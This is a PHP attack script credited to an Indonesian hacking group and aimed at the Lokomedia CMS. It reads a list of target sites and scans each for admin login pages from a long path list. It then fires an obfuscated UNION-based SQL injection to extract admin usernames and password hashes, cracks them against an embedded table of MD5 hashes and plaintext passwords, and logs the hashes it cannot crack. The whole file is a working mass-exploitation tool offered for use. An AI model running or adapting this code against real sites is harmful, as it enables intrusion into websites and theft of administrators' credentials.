<?php
set_time_limit(0);
error_reporting(0);

// Lokomedia (SQL Injection) + Auto Scan Admin Login
// enjoyyyy
// Coded by Mr. Error 404 (l0c4lh34rtz) - IndoXploit - Sanjungan Jiwa
// greetz: res7ock crew - j*ncok Sec
// usage: php namafile.php target.txt

//HARAP TIDAK MENGGANTI COPYRIGHT JIKA KALIAN INGIN DIHARGAI ^^

function cover() {
	print "[ =========================================================================== ]\n";
	print " --> Lokomedia (SQL Injection) + Auto Scan Admin Login <--\n";
	print " ## Coded by Mr. Error 404 (l0c4lh34rtz) - IndoXploit - Sanjungan Jiwa ##\n";
	print " # greetz: res7ock crew - j*ncok Sec #\n";
	print "+++++++ usage: php namafile.php target.txt +++++++\n";
	print "[ =========================================================================== ]\n\n";
}
function ngcurl($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
function simpen($isi) {
	$f = fopen("md5.txt", "a+");
	fwrite($f, "$isi\n");
	fclose($f);
}

$admin = array(
'adm/',
'_adm_/',
'_admin_/',
'_administrator_/',
'operator/',
'sika/',
'develop/',
'ketua/',
'redaktur/',
'author',
'admin/',
'administrator/',
'adminweb/',
'user/',
'users/',
'dinkesadmin/',
'retel/',
'author/',
'panel/',
'paneladmin/',
'panellogin/',
'redaksi/',
'cp-admin/',
'master/',
'master/index.php',
'master/login.php',
'operator/index.php',
'sika/index.php',
'develop/index.php',
'ketua/index.php',
'redaktur/index.php',
'admin/index.php',
'administrator/index.php',
'adminweb/index.php',
'user/index.php',
'users/index.php',
'dinkesadmin/index.php',
'retel/index.php',
'author/index.php',
'panel/index.php',
'paneladmin/index.php',
'panellogin/index.php',
'redaksi/index.php',
'cp-admin/index.php',
'operator/login.php',
'sika/login.php',
'develop/login.php',
'ketua/login.php',
'redaktur/login.php',
'admin/login.php',
'administrator/login.php',
'adminweb/login.php',
'user/login.php',
'users/login.php',
'dinkesadmin/login.php',
'retel/login.php',
'author/login.php',
'panel/login.php',
'paneladmin/login.php',
'panellogin/login.php',
'redaksi/login.php',
'cp-admin/login.php',
'terasadmin/',
'terasadmin/index.php',
'terasadmin/login.php',
'rahasia/',
'rahasia/index.php',
'rahasia/admin.php',
'rahasia/login.php',
'dinkesadmin/',
'dinkesadmin/login.php',
'adminpmb/',
'adminpmb/index.php',
'adminpmb/login.php',
'system/',
'system/index.php',
'system/login.php',
'webadmin/',
'webadmin/index.php',
'webadmin/login.php',
'wpanel/',
'wpanel/index.php',
'wpanel/login.php',
'adminpanel/index.php',
'adminpanel/',
'adminpanel/login.php',
'adminkec/',
'adminkec/index.php',
'adminkec/login.php',
'admindesa/',
'admindesa/index.php',
'admindesa/login.php',
'adminkota/',
'adminkota/index.php',
'adminkota/login.php',
'admin123/',
'admin123/index.php',
'admin123/login.php',
'logout/',
'logout/index.php',
'logout/login.php',
'logout/admin.php',
'adminweb_setting',
);
$real_pass = array(
"a66abb5684c45962d887564f08346e8d" => "admin123456",
"99026ab4ab3de96f3d7ae33c8c85057b" => "master!@#$qwe",
"c630643500720b255abb22e2ab2c31f6" => "sumedang123",
"1c63129ae9db9c60c3e8aa94d3e00495" => "1qaz2wsx", 
"f243df64be7184fb0fc07bd6cf53185b" => "b1smillah",
"93261ae77f0df5522dd9767203f3aa17" => "house69",
"f243df64be7184fb0fc07bd6cf53185b" => "b1smillah",
"37c77ada62ec68d1b740717fc886bef6" => "Suk4bum1",
"d39b59b946b414c4e5926f9c7b23840a" => "kasitaugakya",
"fbff29af096fa646757ce8439b644714" => "vro190588",
"1feadc10e93f2b64c65868132f1e72d3" => "agoes",
"0192023a7bbd73250516f069df18b500" => "admin123",
"7aa1dfee8619ac8f282e296d83eb55ff" => "meong",
"24fa5ee2c1285e115dd6b5fe1c25a333" => "773062",
"d557fd4686821b5d8b927cdfe6e67d21" => "#admin#",
"5fec4ba8376f207d1ff2f0cac0882b01" => "admin!@#",
"a01726b559eeeb5fc287bf0098a22f6c" => "@dm1n",
"73acd9a5972130b75066c82595a1fae3" => "ADMIN",
"511f2efed0e465e700a951f2f1ecec19" => "bs1unt46",
"7b7bc2512ee1fedcd76bdc68926d4f7b" => "Administrator",
"99fedb09f0f5da90e577784e5f9fdc23" => "ADMINISTRATOR",
"e58bfd635502ea963e1d52487ac2edfa" => "!@#123!@#123",
"5449ccea16d1cc73990727cd835e45b5" => "ngadimin",
"c21f969b5f03d33d43e04f8f136e7682" => "default",
"1a1dc91c907325c69271ddf0c944bc72" => "pass",
"fffdf0489f264598e9d35cba0381e9ac" => "sukmapts",
"5f4dcc3b5aa765d61d8327deb882cf99" => "password",
"5ebe2294ecd0e0f08eab7690d2a6ee69" => "secret",
"c893bad68927b457dbed39460e6afd62" => "prueba",
"b2ca9cfa6067282a031d28a54886822d" => "admin4343",
"3a3795bb61d5377545b4f345ff223e3d" => "bingo",
"e172dd95f4feb21412a692e73929961e" => "bismillah",
"8221303fbf816fd9da96be7dd4c92f99" => "salawarhandap123",
"0570e3795fbe97ddd3ce53be141d1aed" => "indoxploit",
"098f6bcd4621d373cade4e832627b4f6" => "test",	
"976adc43eaf39b180d9f2c624a1712cd" => "adminppcp",
"5985609a2dc01098797c94a43e0a1115" => "masarief",
"21232f297a57a5a743894a0e4a801fc3" => "admin",
"1870a829d9bc69abf500eca6f00241fe" => "wordpress",
"126ac9f6149081eb0e97c2e939eaad52" => "blog",
"fe01ce2a7fbac8fafaed7c982a04e229" => "demo",
"04e484000489dd3b3fb25f9aa65305c6" => "redaksi2016",
"91f5167c34c400758115c2a6826ec2e3" => "administrador",
"200ceb26807d6bf99fd6f4f0d1ca54d4" => "administrator",
"c93ccd78b2076528346216b3b2f701e6" => "admin1234",
"912ec803b2ce49e4a541068d495ab570" => "asdf",
"1adbb3178591fd5bb0c248518f39bf6d" => "asdf1234",
"e99a18c428cb38d5f260853678922e03" => "abc123",
"a152e841783914146e4bcd4f39100686" => "asdfgh",
"a384b6463fc216a5f8ecb6670f86456a" => "qwert",
"d8578edf8458ce06fbc5bb76a58c5ca4" => "qwerty",
"b59c67bf196a4758191e42f76670ceba" => "1111",
"96e79218965eb72c92a549dd5a330112" => "111111",
"4297f44b13955235245b2497399d7a93" => "123123",
"c33367701511b4f6020ec61ded352059" => "654321",
"81dc9bdb52d04dc20036dbd8313ed055" => "1234",
"e10adc3949ba59abbe56e057f20f883e" => "123456",
"fcea920f7412b5da7be0cf42b8c93759" => "1234567",
"25d55ad283aa400af464c76d713c07ad" => "12345678",
"25f9e794323b453885f5181f1b624d0b" => "123456789",
"e807f1fcf82d132f9bb018ca6738a19f" => "1234567890",
"befe9f8a14346e3e52c762f333395796" => "qawsed",
"76419c58730d9f35de7ac538c2fd6737" => "qazwsx",
"5f4dcc3b5aa765d61d8327deb882cf99" => "password",
"bed128365216c019988915ed3add75fb" => "passw0rd",
"21232f297a57a5a743894a0e4a801fc3" => "admin",
"e10adc3949ba59abbe56e057f20f883e" => "123456",
"5f4dcc3b5aa765d61d8327deb882cf99" => "password",
"25d55ad283aa400af464c76d713c07ad" => "12345678",
"f379eaf3c831b04de153469d1bec345e" => "666666",
"96e79218965eb72c92a549dd5a330112" => "111111",
"fcea920f7412b5da7be0cf42b8c93759" => "1234567",
"d8578edf8458ce06fbc5bb76a58c5ca4" => "qwerty",
"6f3cac6213ffceee27cc85414f458caa" => "siteadmin",
"200ceb26807d6bf99fd6f4f0d1ca54d4" => "administrator",
"63a9f0ea7bb98050796b649e85481845" => "root",
"4297f44b13955235245b2497399d7a93" => "123123",
"c8837b23ff8aaa8a2dde915473ce0991" => "123321",
"e807f1fcf82d132f9bb018ca6738a19f" => "1234567890",
"4ca7c5c27c2314eecc71f67501abb724" => "letmein123",
"cc03e747a6afbbcbf8be7668acfebee5" => "test123",
"62cc2d8b4bf2d8728120d052163a77df" => "demo123",
"32250170a0dca92d53ec9624f336ca24" => "pass123",
"46f94c8de14fb36680850768ff1b7f2a" => "123qwe",
"200820e3227815ed1756a6b531e7e0d2" => "qwe123",
"c33367701511b4f6020ec61ded352059" => "654321",
"f74a10e1d6b2f32a47b8bcb53dac5345" => "loveyou",
"172eee54aa664e9dd0536b063796e54e" => "adminadmin123",
"e924e336dcc4126334c852eb8fadd334" => "waskita1234",
"02631cc1d0cc5bda188566e90d0ae16c" => "rsamku2013",
"b69cbef044eac6fc514a2988e62c5b30" => "unlock08804",
"12e110a1b89da9b09a191f1f9b0a1398" => "nalaratih",
"f70d32432ff0a8984b5aadeb159f9db6" => "Much240316",
"a2fffa77aa0dde8cd4c416b5114eba21" => "gondola",
"2b45af95ce316ea4cffd2ce4093a2b83" => "w4nd3szaki",
"c5612a125d8613ddae79a6b36c8bee37" => "Reddevil#21",
"6e7fbe8e6147e2c430ce7e8ab883e533" => "R4nd0m?!",
"5136850b6c8f3ebc66122188347efda0" => "adminku",
"5214905fbe8d7f0bb0d0a328f08af3f0" => "adminpust4k4",
"acfc976c2d22e4a595a9ee6fc0d05f27" => "dikmen2016",
"dcdee606657b5f7d8b218badfeb22a90" => "masputradmin",
"ecb4208ee41389259a632d3a733c2786" => "741908",
"827ccb0eea8a706c4c34a16891f84e7b" => "12345",
"855be097acdf2fea4e342615a154ca3c" => "tolol",
"eeee80342778e7b497d507f89094b10d" => "master10",
"d29c0398602e6cf005f0dcb7a0443c7d" => "adminjalan",
"9062756924cf10763cc89cf2793a77ab" => "pass4@nd1",
"8b6bc5d8046c8466359d3ac43ce362ab" => "ganteng",
"528d06a172eb2d8fab4e93f33f3986a8" => "jasindolive",
"058fe7f85df1e992ef7bf948f1db7842" => "404J",
"abe1f4492f922a9111317ed7f7f8e723" => "bantarjati5",
);
$sites = explode("\n", file_get_contents($argv[1]));
if(isset($argv[1])) {
	cover();
	foreach($sites as $url) {
		if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {
			$url = "http://$url";
		} else {
			$url = $url;
		}
		$statis = "";
		$sisa = "";
		$login = "";
		$param_list = array("statis","kategori","berita");
		$curl = ngcurl($url);
		$curl = str_replace("'", '"', $curl);
		foreach($param_list as $param) {
			preg_match_all("/$param-(.*?)\">/", $curl, $id);
			foreach($id[1] as $stat) {
				$pecah = explode("-", $stat);
				$statis .= $pecah[0];
				$sisa .= $pecah[1];
				break;
			}
			foreach($admin as $adminweb) {
				$curl_admin = ngcurl("$url/$adminweb");
				if(preg_match("/administrator|username|password/i", $curl_admin) AND !preg_match("/not found|forbidden|404|403|500/i", $curl_admin)) {
					$login .= "$url/$adminweb";
					break;
				}
			}
			$sql = ngcurl("$url/$param-$statis'/*!50000UniON*/+/*!50000SeLeCT*/+/*!50000cOnCAt*/(0x696e646f78706c6f6974,0x3c6c693e,username,0x20,password,0x3c6c693e)+from+users--+---+-$sisa");
			preg_match("/<meta name=\"description\" content=\"(.*?)\">/", $sql, $up);
			preg_match("/<li>(.*)<li>/", $up[1], $akun);
			$data = explode(" ", $akun[1]);
			print "[+] URL: $url\n";
			//print "[+] param: $param\n";
			if(htmlspecialchars($curl) !== htmlspecialchars($sql)) {
				if(preg_match("/indoxploit/", $sql)) {
					//print "[ Injection Successfully ]\n";
					if($data[0] == "" || $data[1] == "") {
						print "[+] Not Injected :(\n\n";
						break;
					} else {
						print "[+] username: ".$data[0]."\n";
						$passwd = $real_pass[$data[1]];
						if($passwd == "") {
							$passwd = $data[1];
							simpen($data[1]);
						}
						print "[+] password: $passwd\n";
					}
					if($login == "") {
						print "[+] Login Admin ga ketemu :(\n\n";
					} else {
						print "[+] Login: $login\n\n";
					}
					break;
				} else {
					print "[+] Not Injected :(\n\n";
					break;
				}
			} else {
				print "[+] Not Injected :(\n\n";
				break;
			}
		}
	}
} else {
	print "usage: php ".$argv[0]." target.txt\n";
}
?>